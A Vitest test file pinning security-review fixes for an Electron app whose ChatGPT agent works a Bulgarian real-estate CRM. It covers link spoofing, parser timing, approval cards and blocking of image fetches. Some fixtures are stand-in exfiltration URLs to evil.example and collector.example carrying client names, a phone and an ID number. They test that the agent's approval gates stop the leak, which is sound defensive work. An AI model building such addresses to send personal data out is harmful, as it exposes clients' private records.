// 0.1.5 review fixes – one pin per finding of the security/purity/UX review that MAIN or a pure module owns
// (the renderer findings are in tests/e2e/review-015.spec.js). Every test asserts the required behaviour.
import { describe, it, expect } from "vitest";
import os from "node:os";
import { Unzip, UnzipInflate } from "fflate";
import { createAgent, fileListLine, ZIP_PER_ANSWER } from "../../electron/agent/loop.js";
import { createUploads } from "../../electron/agent/uploads.js";
import { createFiles } from "../../electron/files.js";
import { buildZip, createProjects } from "../../electron/projects.js";
import { STAFF_TOOLS } from "../../electron/agent/tools-spec.js";
import { aiOff, aiRefusal, approvalTitle, guardTools, inputLines } from "../../electron/agent/gate.js";
import { CHATGPT_URL_MAX, chatgptUrl, chatgptUrlLength, fitsLink } from "../../electron/agent/chatgpt-link.js";
import { consumeStream } from "../../electron/realgpt/responses.js";
import { createHandlers } from "../../electron/ipc.js";
import { installSecurity } from "../../electron/security.js";
import { createImageProvenance } from "../../electron/browse/provenance.js";
import { createBrowser } from "../../electron/browse/net.js";
import { createPages } from "../../electron/browse/page.js";
import { domainOf, looksLikeAddress, parseBlocks, parseInline } from "../../src/lib/md.js";
import { activitySummary } from "../../src/lib/agent.js";

const enc = new TextEncoder();
const sse = (obj) => `event: ${obj.type}\ndata: ${JSON.stringify(obj)}\n\n`;
async function round({ text = "", calls = [] } = {}) {
  const items = [];
  if (text) items.push({ type: "message", id: "msg_1", role: "assistant", status: "completed", content: [{ type: "output_text", text, annotations: [] }] });
  calls.forEach((c, i) => items.push({ type: "function_call", id: `fc_${i}`, call_id: `call_${i}`, namespace: "ted", name: c.name, arguments: JSON.stringify(c.args || {}), status: "completed" }));
  let wire = text ? sse({ type: "response.output_text.delta", delta: text }) : "";
  for (const it of items) wire += sse({ type: "response.output_item.done", item: it });
  wire += sse({ type: "response.completed", response: { model: "gpt-test", status: "completed", output: items } });
  return consumeStream(new ReadableStream({ start(c) { c.enqueue(enc.encode(wire)); c.close(); } }));
}
const TINY = Buffer.from([0xff, 0xd8, 0xff, 0xe0, ...Array(40).fill(3)]);
const PHOTO = Buffer.concat([TINY, Buffer.alloc(20_000, 3)]); // over the site's 15 000-byte gallery minimum
const manifest = STAFF_TOOLS.map((name) => ({ name, description: "" }));

// The agent exactly as main.js wires it (guardTools around the CRM transport), with fakes.
function env({ approvals = [], toolsAnswer } = {}) {
  let n = 0;
  const files = createFiles({ library: null, tempRoot: os.tmpdir(), shell: {}, dialog: {}, confirm: async () => true, newId: () => `file${String(++n).padStart(6, "0")}` });
  const toolCalls = [];
  const signed = [];
  const raw = {
    manifest: async () => manifest,
    rolePrompt: async () => null,
    call: async (tool, input) => {
      toolCalls.push([tool, structuredClone(input)]);
      if (toolsAnswer) { const r = toolsAnswer(tool, input); if (r) return r; }
      if (tool === "cases.get") return { ok: true, result: { kase: { id: input.id, title: "Продажба · къща", client: "Тестов Клиент А", client_id: "cl-1" }, facts: [] } };
      if (tool === "clients.get") return input.id === "cl-STRANGER" ? { ok: true, result: { client: { id: input.id, name: "Непознат Клиент Б" } } } : { ok: false, error: "Няма такъв клиент." };
      if (tool === "properties.create") return { ok: true, result: { id: "pr-1", code: "P-1042", title: input.title } };
      if (tool === "images.download") return { ok: true, result: { downloaded: (input.urls || []).length } };
      return { ok: true, result: { ok: 1 } };
    },
  };
  const tools = guardTools(raw);
  const session = { authed: async (o) => {
    if (/object\/sign/.test(o.url)) { signed.push(o.json); return { ok: true, status: 200, json: o.json.paths.map((p) => ({ path: p, signedURL: `/object/sign/nd-files/${p}?token=t` })) }; }
    return { ok: true, status: 200, text: "{}" };
  } };
  const uploads = createUploads({ session, files, now: () => new Date(Date.UTC(2026, 10, 17)) });
  const projects = createProjects({ files, uploads, tools, session, dialog: {}, confirm: async () => true });
  const events = [];
  const rounds = [];
  let i = 0;
  const bodies = [];
  const stream = async (body) => { bodies.push(structuredClone(body)); const r = rounds[i++]; if (!r) throw new Error("no more rounds"); return { ok: true, outcome: r }; };
  const agent = createAgent({ tools, files, uploads, projects, http: { request: async () => ({ ok: false, status: 404 }) }, confirm: async () => true, newId: (() => { let k = 0; return () => `id${++k}`; })() });
  const emit = (ev) => {
    events.push(ev);
    if (ev.type === "approval") { const d = approvals.shift() || { decision: "allow" }; setTimeout(() => agent.approve({ requestId: "r1", approvalId: ev.approval.id, ...d }), 0); }
  };
  const run = (extra = {}) => agent.run({ requestId: "r1", model: "gpt-test", messages: [{ role: "user", text: "Събирай всичко за клиента в папка" }], stream, emit, ...extra });
  return { run, files, toolCalls, signed, events, bodies, rounds, projects };
}
const outputs = (body) => body.input.filter((x) => x.type === "function_call_output").map((x) => JSON.parse(x.output));
const approvalsOf = (events) => events.filter((e) => e.type === "approval").map((e) => e.approval);
const plain = (nodes) => nodes.map((n) => (n.t === "text" || n.t === "code" ? n.v : n.c ? plain(n.c) : n.label || "")).join("");
const visible = (n) => (n.t === "chip" ? n.label : n.t === "a" ? plain(n.c) + " " + n.dom : n.v || "");

describe("F1 Markdown: link text can never hide where a link goes", () => {
  for (const [src, realHost] of [
    ["[olx.bg](https://evil.example/d/ad/1)", "evil.example"],
    ["[https://www.olx.bg/d/ad/kashta-123](https://evil.example/p)", "evil.example"],
    ["[olx.bg](https://olx.bg.evil.example/d/ad/1)", "olx.bg.evil.example"],
    ["[olx.bg](https://оlx.bg/d/ad/1)", "xn--lx-emc.bg"], // a Cyrillic „о“
    ["[office@imotinadezhda.bg](mailto:evil@example.com)", "evil@example.com"],
  ]) {
    it(`${src} shows ${realHost}`, () => {
      const [node] = parseInline(src);
      expect(node).toMatchObject({ t: "chip" });
      expect(visible(node)).toBe(realHost);
      expect(node.href).toBe(src.slice(src.indexOf("](") + 2, -1));
    });
  }
  it("an ordinary link text keeps its words and always carries the real domain; the hover title is the real address", () => {
    const [n] = parseInline('[Двустаен, Център](https://www.olx.bg/d/ad/1 "imot.bg – истинската обява")');
    expect(n).toMatchObject({ t: "a", href: "https://www.olx.bg/d/ad/1", title: "https://www.olx.bg/d/ad/1", dom: "olx.bg" });
    expect(looksLikeAddress("Двустаен, Център")).toBe(false);
    expect(looksLikeAddress("www.olx.bg/d/ad/x")).toBe(true);
    expect(domainOf("https://оlx.bg/")).toBe("xn--lx-emc.bg");
  });
});

describe("F2 Markdown: linear time on walls of delimiters (400 000 chars)", () => {
  for (const unit of ["*a ", "_a ", "~~a ", "***a ", "[", "![", "[a](b", "[a](", "[a](<", "``a ", "`", "*a* "]) {
    it(`${JSON.stringify(unit)} on one line and on many lines`, () => {
      for (const s of [unit.repeat(Math.ceil(19_990 / unit.length)), unit.repeat(Math.ceil(400_000 / unit.length)), (unit + "\n").repeat(Math.ceil(400_000 / (unit.length + 1)))]) {
        const t = performance.now();
        parseBlocks(s);
        expect(performance.now() - t).toBeLessThan(1500);
      }
    });
  }
  it("still parses real Markdown the same way", () => {
    expect(parseInline("**а** [б](https://x.example/1) `в`").map((n) => n.t)).toEqual(["b", "text", "a", "text", "code"]);
    expect(parseInline("[a](https://x.example/(b)c)")[0]).toMatchObject({ t: "a", href: "https://x.example/(b)c" });
  });
});

describe("F3 save_to_crm: the card names the client by the CRM's record, never by a name the model wrote", () => {
  it("client_id of one client + client_name of another → the card shows the id and the CRM's name of THAT id", async () => {
    const e = env();
    e.files.add({ name: "лична-карта.jpg", mime: "", data: PHOTO, origin: "user", caseId: "case-1", caseTitle: "Продажба · къща" });
    e.rounds.push(await round({ calls: [{ name: "project_folder", args: { action: "save_to_crm", client_id: "cl-STRANGER", client_name: "Тестов Клиент А" } }] }), await round({ text: "." }));
    await e.run({ caseId: "case-1" });
    const [ap] = approvalsOf(e.events);
    const where = ap.lines.find(([k]) => k === "Къде")[1];
    expect(where).toContain("cl-STRANGER");
    expect(where).toContain("Непознат Клиент Б");
    expect(where).not.toContain("Тестов Клиент А");
    expect(e.toolCalls.find(([t]) => t === "files.attach")[1].client_id).toBe("cl-STRANGER");
  });
  it("an id the CRM does not know is shown as the id only", async () => {
    const e = env({ approvals: [{ decision: "deny" }] });
    e.files.add({ name: "a.pdf", mime: "", data: Buffer.from("%PDF-1.4 a"), origin: "user", caseId: "case-1", caseTitle: "П" });
    e.rounds.push(await round({ calls: [{ name: "project_folder", args: { action: "save_to_crm", client_id: "cl-X", client_name: "Тестов Клиент А" } }] }), await round({ text: "." }));
    await e.run({ caseId: "case-1" });
    expect(approvalsOf(e.events)[0].lines.find(([k]) => k === "Къде")[1]).toMatch(/^клиент с id cl-X/);
  });
});

describe("F4 „Разреши всички“ never covers an upload of this computer's files", () => {
  it("allow_all on clients.update → save_to_crm still shows its own card with the files (and offers no „всички“)", async () => {
    const e = env({ approvals: [{ decision: "allow_all" }, { decision: "allow" }] });
    for (let k = 0; k < 5; k++) e.files.add({ name: `документ-${k}.pdf`, mime: "", data: Buffer.from("%PDF-1.4 x" + k), origin: "user", caseId: "case-1", caseTitle: "Продажба · къща" });
    e.rounds.push(
      await round({ calls: [{ name: "crm", args: { tool: "clients.update", input: { id: "cl-1", note: "x" } } }] }),
      await round({ calls: [{ name: "project_folder", args: { action: "save_to_crm" } }] }),
      await round({ text: "." }),
    );
    await e.run({ caseId: "case-1" });
    const aps = approvalsOf(e.events);
    expect(aps).toHaveLength(2);
    expect(aps[1]).toMatchObject({ tool: "files.attach", allowAll: false });
    expect(aps[1].title).toContain("папката");
    expect(e.toolCalls.filter(([t]) => t === "files.attach")).toHaveLength(5);
  });
  it("allow_all on properties.create → the chat photos still get their own card before upload, signing or the gallery", async () => {
    const e = env({ approvals: [{ decision: "allow_all" }, { decision: "deny" }] });
    const p1 = e.files.add({ name: "хол.jpg", mime: "", data: PHOTO, origin: "user" }).file;
    e.rounds.push(
      await round({ calls: [{ name: "crm", args: { tool: "properties.create", input: { title: "Т", deal: "sale", type: "Апартамент", price: 99000, area: 65, city: "Тест" } } }] }),
      await round({ calls: [{ name: "crm", args: { tool: "images.download", input: { urls: [`file:${p1.id}`], property_code: "P-1042" } } }] }),
      await round({ text: "." }),
    );
    await e.run({ messages: [{ role: "user", text: "Качи имот", files: [p1.id] }] });
    const aps = approvalsOf(e.events);
    expect(aps.map((a) => a.tool)).toEqual(["properties.create", "images.download"]);
    expect(aps[1]).toMatchObject({ allowAll: false, title: "ChatGPT иска да добави 1 снимка в галерията на имот P-1042" });
    expect(e.signed).toEqual([]);
    expect(e.toolCalls.map(([t]) => t)).toEqual(["properties.create"]);
  });
});

describe("F5 open_in_chatgpt: the cap is on the encoded LINK (Cyrillic = 6 characters per letter)", () => {
  const fakeSecurity = () => {
    const opened = [];
    const s = installSecurity({
      app: { on() {} }, log: null,
      session: { on() {}, setPermissionRequestHandler() {}, setPermissionCheckHandler() {}, setDevicePermissionHandler() {} },
      shell: { openExternal: async (u) => { opened.push(u); } },
    });
    return { s, opened };
  };
  it("a 1 300-letter Bulgarian prompt opens; a 1 500-letter one is refused as too_long and {bare:true} opens chatgpt.com", async () => {
    const { s, opened } = fakeSecurity();
    const h = createHandlers({ appApi: { openExternal: s.openExternal } });
    const bg = "Фотореалистична снимка на двуетажна къща в Шумен, ".repeat(40);
    const ok = bg.slice(0, 1300);
    expect(fitsLink(ok)).toBe(true);
    expect(chatgptUrlLength(ok)).toBeLessThanOrEqual(CHATGPT_URL_MAX);
    expect(await h["ted:realgpt.openInChatGpt"]({ prompt: ok })).toEqual({ ok: true });
    const long = bg.slice(0, 1500);
    expect(chatgptUrl(long)).toBeNull();
    expect(await h["ted:realgpt.openInChatGpt"]({ prompt: long })).toMatchObject({ ok: false, code: "too_long" });
    expect(await h["ted:realgpt.openInChatGpt"]({ bare: true })).toEqual({ ok: true });
    expect(opened).toEqual([chatgptUrl(ok), "https://chatgpt.com/"]);
    expect(chatgptUrl("a".repeat(4000))).toMatch(/^https:\/\/chatgpt\.com\/\?q=a+$/); // Latin still fits 4 000
  });
  it("the agent still shows the card for a long prompt and tells the model to keep the next one shorter", async () => {
    const e = env();
    e.rounds.push(await round({ calls: [{ name: "open_in_chatgpt", args: { prompt: "Снимка ".repeat(300), kind: "image" } }] }), await round({ text: "." }));
    await e.run();
    expect(e.events.some((x) => x.type === "chatgpt")).toBe(true);
    expect(outputs(e.bodies[1])[0]).toMatchObject({ ok: true, shown: true, opened: false, tooLongForLink: true });
  });
});

describe("F6 the „Файлове“ line of a folder card never cuts a name and counts the rest", () => {
  it("50 long names → whole names only + „…и още N“", () => {
    const list = Array.from({ length: 50 }, (_, k) => ({ name: `Нотариален акт и скица на имота – клиент ${String(k).padStart(2, "0")}.pdf` }));
    const line = fileListLine(list);
    const shown = list.filter((f) => line.includes(`„${f.name}“`)).length;
    expect(line).toMatch(new RegExp(`^50: .*…и още ${50 - shown} – вижте „Точните данни“$`));
    expect(shown).toBeGreaterThan(5);
    expect(fileListLine([{ name: "a.pdf" }, { name: "b.pdf" }])).toBe("2: „a.pdf“, „b.pdf“");
  });
});

describe("F7 + F13 ted.browse.image: https to the end, and only pictures MAIN itself handed out load without a click", () => {
  it("an https picture that redirects to http is refused", async () => {
    const seen = [];
    const fetchImpl = async (url) => {
      seen.push(url);
      if (url.startsWith("https://")) return new Response(null, { status: 302, headers: { location: url.replace("https://", "http://") } });
      return new Response(PHOTO, { status: 200, headers: { "content-type": "image/jpeg" } });
    };
    const browser = createBrowser({ fetchImpl, lookup: async () => [{ address: "93.184.216.34", family: 4 }] });
    const pages = createPages({ browser });
    const h = createHandlers({ pages, settings: { get: () => ({}) } });
    const r = await h["ted:browse.image"]({ url: "https://img.example.bg/photo.jpg", clicked: true });
    expect(seen.at(-1)).toMatch(/^http:\/\//);
    expect(r).toMatchObject({ ok: false, code: "insecure" });
  });
  it("without a click: only addresses of tool results (live events or saved answers); a click loads any https address", async () => {
    const asked = [];
    const pages = { fetchImage: async ({ url }) => { asked.push(url); return { ok: true, file: { buffer: PHOTO, mime: "image/jpeg", sourceUrl: url } }; } };
    const prov = createImageProvenance();
    const h = createHandlers({ pages, settings: { get: () => ({}) }, imageProvenance: prov, chats: { load: async () => ({ chats: [{ messages: [{ role: "assistant", agent: { images: ["https://img.example.bg/saved.jpg"], files: [{ sourceUrl: "https://img.example.bg/fetched.jpg" }] } }] }] }) } });
    const leak = "https://collector.example/p.jpg?client=Тестов%20Клиент%20А&egn=8001011234";
    expect(await h["ted:browse.image"]({ url: leak })).toMatchObject({ ok: false, code: "not_allowed" });
    expect(asked).toEqual([]);
    prov.observe({ requestId: "r1", type: "images", urls: ["https://img.example.bg/page.jpg"] });
    expect((await h["ted:browse.image"]({ url: "https://img.example.bg/page.jpg" })).ok).toBe(true);
    await h["ted:store.loadChats"]();
    expect((await h["ted:browse.image"]({ url: "https://img.example.bg/saved.jpg" })).ok).toBe(true);
    expect((await h["ted:browse.image"]({ url: "https://img.example.bg/fetched.jpg" })).ok).toBe(true);
    expect((await h["ted:browse.image"]({ url: leak, clicked: true })).ok).toBe(true); // the employee's own click
    expect(await h["ted:browse.image"]({ url: leak, clicked: "yes" })).toMatchObject({ ok: false, code: "invalid" });
    // Without a provenance object nothing loads by itself.
    const bare = createHandlers({ pages, settings: { get: () => ({}) } });
    expect(await bare["ted:browse.image"]({ url: "https://img.example.bg/page.jpg" })).toMatchObject({ ok: false, code: "not_allowed" });
  });
});

describe("F8 project ZIP keeps every name, „__proto__“ included", () => {
  it("names are entries, never object keys", async () => {
    const buf = await buildZip([{ name: "__proto__", bytes: Buffer.from("secret") }, { name: "constructor", bytes: Buffer.from("c") }, { name: "оферта.pdf", bytes: Buffer.from("%PDF") }]);
    const names = [];
    const uz = new Unzip((f) => { names.push(f.name); f.ondata = () => {}; f.start(); });
    uz.register(UnzipInflate);
    uz.push(new Uint8Array(buf), true);
    expect(names).toEqual(["__proto__", "constructor", "оферта.pdf"]);
  });
});

describe("F9 export_zip: one ZIP per folder state, at most ZIP_PER_ANSWER per answer", () => {
  it("6 calls in one answer → 1 ZIP kept, the others reuse it", async () => {
    const e = env();
    e.files.add({ name: "скица.pdf", mime: "", data: Buffer.alloc(2 * 1048576, 7), origin: "user", caseId: "case-1", caseTitle: "П" });
    e.rounds.push(await round({ calls: Array.from({ length: 6 }, () => ({ name: "project_folder", args: { action: "export_zip" } })) }), await round({ text: "." }));
    const r = await e.run({ caseId: "case-1" });
    expect(r.files.filter((f) => /\.zip$/.test(f.name))).toHaveLength(1);
    expect(outputs(e.bodies[1]).filter((o) => o.reused)).toHaveLength(5);
    expect(ZIP_PER_ANSWER).toBe(2);
  });
});

describe("F10 images.download: a model-built address with CRM data needs the „web“ card (hybrid rule, CONTRACT §9.3 rule 8)", () => {
  it("the Проект's client and a phone in the address → a strict card naming them (no „за този сайт“ / „всички“); denied → nothing reaches /api/tools", async () => {
    const e = env({ approvals: [{ decision: "deny" }] });
    e.rounds.push(await round({ calls: [{ name: "crm", args: { tool: "images.download", input: { page_url: "https://evil.example/c?client=Тестов%20Клиент%20А&phone=0888123456" } } }] }), await round({ text: "." }));
    await e.run({ caseId: "case-1" });
    const aps = approvalsOf(e.events);
    expect(aps).toHaveLength(1);
    expect(aps[0]).toMatchObject({ kind: "web" });
    expect(aps[0].lines[0][1]).toContain("evil.example");
    expect(aps[0]).toMatchObject({ allowAll: false, allowHost: false });
    expect(aps[0].host).toBeUndefined();
    expect(aps[0].lines.find((l) => l[0] === "Лични данни")[1]).toMatch(/Тестов.*0888123456|0888123456.*Тестов/);
    expect(e.toolCalls.map(([t]) => t)).toEqual(["cases.get"]);
  });
  it("a model-built photo address without personal data: no card in a chat without private data; in a Проект one card per site – „Разреши за този сайт“ covers the next photos of that site", async () => {
    const dl = (urls) => round({ calls: [{ name: "crm", args: { tool: "images.download", input: { urls } } }] });
    let e = env();
    e.rounds.push(await dl(["https://imoti.example.com/snimka-1.jpg"]), await round({ text: "." }));
    await e.run();
    expect(approvalsOf(e.events)).toEqual([]);
    expect(e.toolCalls.map(([t]) => t)).toEqual(["images.download"]);
    e = env({ approvals: [{ decision: "allow_host" }] });
    e.rounds.push(await dl(["https://imoti.example.com/snimka-1.jpg"]), await dl(["https://imoti.example.com/snimka-2.jpg", "https://www.imoti.example.com/snimka-3.jpg"]), await round({ text: "." }));
    await e.run({ caseId: "case-1" });
    const aps = approvalsOf(e.events);
    expect(aps).toHaveLength(1);
    expect(aps[0]).toMatchObject({ kind: "web", allowAll: true, allowHost: true, host: "imoti.example.com" });
    expect(aps[0].lines.some((l) => l[0] === "Лични данни")).toBe(false);
    expect(e.toolCalls.map(([t]) => t)).toEqual(["cases.get", "images.download", "images.download"]);
  });
  it("one call with an address that carries a phone and a model-built one without: the strict card lists both – nothing reaches the server unseen", async () => {
    const urls = ["https://evil.example/a.jpg?p=0888123456", "https://other.example/0888.jpg"];
    const e = env({ approvals: [{ decision: "deny" }] });
    e.rounds.push(await round({ calls: [{ name: "crm", args: { tool: "images.download", input: { urls } } }] }), await round({ text: "." }));
    await e.run({ caseId: "case-1" });
    const aps = approvalsOf(e.events);
    expect(aps).toHaveLength(1);
    expect(aps[0]).toMatchObject({ kind: "web", allowAll: false, allowHost: false });
    expect(aps[0].lines[0]).toEqual(["Адрес", urls.join("\n")]);
    expect(aps[0].lines[1]).toEqual(["Сайт", "evil.example, other.example"]);
    expect(e.toolCalls.map(([t]) => t)).toEqual(["cases.get"]);
  });
  it("an address from the employee's own message needs no card", async () => {
    const e = env();
    e.rounds.push(await round({ calls: [{ name: "crm", args: { tool: "images.download", input: { page_url: "https://www.olx.bg/d/ad/kashta-1" } } }] }), await round({ text: "." }));
    await e.run({ caseId: "case-1", messages: [{ role: "user", text: "Свали снимките от https://www.olx.bg/d/ad/kashta-1" }] });
    expect(approvalsOf(e.events)).toEqual([]);
  });
});

describe("F12 photos into a gallery: only what the server really stored is reported as saved", () => {
  it("server stores 1 of 3 → saved 1, the 3 photos say „проверете“, small photos are left out before sending", async () => {
    const e = env({ toolsAnswer: (tool, input) => (tool === "images.download" ? { ok: true, result: { downloaded: 1, of: input.urls.length } } : null) });
    for (const n of ["хол.jpg", "кухня.jpg", "баня.jpg"]) e.files.add({ name: n, mime: "", data: PHOTO, origin: "user", caseId: "case-1", caseTitle: "П" });
    e.files.add({ name: "икона.jpg", mime: "", data: TINY, origin: "user", caseId: "case-1", caseTitle: "П" });
    e.rounds.push(await round({ calls: [{ name: "project_folder", args: { action: "save_to_crm", property_code: "P-1042" } }] }), await round({ text: "." }));
    await e.run({ caseId: "case-1" });
    const out = outputs(e.bodies[1])[0];
    expect(out).toMatchObject({ saved: 1, failed: 3 });
    expect(out.results.filter((x) => x.maybeExecuted)).toHaveLength(3);
    expect(out.results.find((x) => x.name === "икона.jpg").error).toContain("15 KB");
    expect(e.toolCalls.find(([t]) => t === "images.download")[1].urls).toHaveLength(3);
  });
  it("the chat-photo path leaves out photos the site would skip and says which", async () => {
    const e = env();
    const big = e.files.add({ name: "хол.jpg", mime: "", data: PHOTO, origin: "user" }).file;
    const small = e.files.add({ name: "икона.jpg", mime: "", data: TINY, origin: "user" }).file;
    e.rounds.push(await round({ calls: [{ name: "crm", args: { tool: "images.download", input: { urls: [`file:${big.id}`, `file:${small.id}`], property_code: "P-1042" } } }] }), await round({ text: "." }));
    await e.run({ messages: [{ role: "user", text: "Добави снимките", files: [big.id, small.id] }] });
    const out = outputs(e.bodies[1])[0];
    expect(out.skipped).toEqual([{ name: "икона.jpg", why: expect.stringContaining("15 KB") }]);
    expect(e.toolCalls.find(([t]) => t === "images.download")[1]).toMatchObject({ property_code: "P-1042", max: 1 });
  });
});

describe("purity: documents.merge can never switch on the server's Gemini grouping", () => {
  it("group_by_type is always sent false; a model asking for it is refused", () => {
    expect(aiOff("documents.merge", { files: ["file:abcdefgh12"], group_by_type: true })).toMatchObject({ group_by_type: false });
    expect(aiRefusal("documents.merge", { group_by_type: true })).toMatchObject({ ok: false });
    expect(aiRefusal("documents.merge", { group_by_type: false })).toBeNull();
  });
});

describe("cards in Bulgarian and attributed to ChatGPT (review UX + (c))", () => {
  it("values: продажба / наем, € with thousands, м²; titles: photos into a gallery, a new project", () => {
    const lines = Object.fromEntries(inputLines({ title: "Т", deal: "sale", price: 99000, area: 65, city: "Тест" }));
    expect(lines).toMatchObject({ Сделка: "продажба", Цена: "99 000 €", "Площ (м²)": "65 м²" });
    expect(Object.fromEntries(inputLines({ deal: "rent" })).Сделка).toBe("наем");
    expect(approvalTitle("images.download", { property_code: "P-1042" }, { photos: 2 })).toBe("ChatGPT иска да добави 2 снимки в галерията на имот P-1042");
    expect(approvalTitle("cases.create", { title: "Клиент В" })).toBe("ChatGPT иска да създаде проект „Клиент В“");
    expect(approvalTitle("clients.create")).toBe("ChatGPT иска да създаде: клиенти");
  });
  it("the photo card names files only (the ids stay in „Точните данни“)", async () => {
    const e = env({ approvals: [{ decision: "deny" }] });
    const p1 = e.files.add({ name: "хол.jpg", mime: "", data: PHOTO, origin: "user" }).file;
    e.rounds.push(await round({ calls: [{ name: "crm", args: { tool: "images.download", input: { urls: [`file:${p1.id}`], property_code: "P-1042" } } }] }), await round({ text: "." }));
    await e.run({ messages: [{ role: "user", text: "Добави снимката", files: [p1.id] }] });
    const [ap] = approvalsOf(e.events);
    expect(ap.lines.find(([k]) => k === "Снимки")[1]).toBe("„хол.jpg“");
    expect(ap.lines.map(([, v]) => v).join(" ")).not.toContain("file:");
    expect(ap.json).toContain(`file:${p1.id}`);
  });
  it("the activity line: photos INTO the gallery with the real count; folder steps by what they did", () => {
    const st = (kind, label, detail) => ({ id: label, kind, label, status: "ok", detail });
    expect(activitySummary([st("crm", "CRM: имоти.създаване"), st("image", "Добавям снимки в галерията", "2 снимки в галерията"), st("upload", "Качвам „a.jpg“"), st("upload", "Качвам „b.jpg“")]).text)
      .toBe("Изпълни 1 действие в CRM, добави 2 снимки в галерията и качи 2 файла в CRM");
    expect(activitySummary([st("folder", "Папка „П“: правя ZIP", "3 файла · 1 MB")]).text).toBe("Направи ZIP на папката");
    expect(activitySummary([st("folder", "Папка „П“: добавям 2 файла", "2 в папката")]).text).toBe("Добави 2 файла в папката на проекта");
    expect(activitySummary([st("folder", "Папка „П“: преглед", "3 файла")]).text).toBe("Прегледа папката на проекта");
  });
});
